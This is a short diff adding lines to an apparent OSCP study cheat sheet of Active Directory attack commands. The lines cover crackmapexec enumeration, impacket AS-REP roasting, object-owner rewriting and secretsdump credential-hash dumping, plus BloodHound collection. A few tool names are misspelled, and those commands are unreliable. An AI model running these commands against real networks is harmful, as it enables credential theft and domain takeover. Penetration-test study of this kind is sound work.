@@ -1,3 +1,13 @@
+user enumration
+
+crackmapexec smb 1.1.1.1 -u "username" -p "password" --users (--groups) (--pass-pol)
+impacket.getNPUsers domain.local/ -no-pass -usersfile users.txt
+impacket.ownere'dit -action write -new-owner "yourusername" -target "targetusername" "domain.local"/'yourusername':'yourpassword' -dc-ip 192.168.1.1
+impacket-secretsdump domain.local/username@IP
+
+
+
+
 cheat sheet oscp
 Bloodhound
 bloodhound-python -d domain.local -u username -p password -v --zip -c All -dc domain.local -ns 192.168.1.1
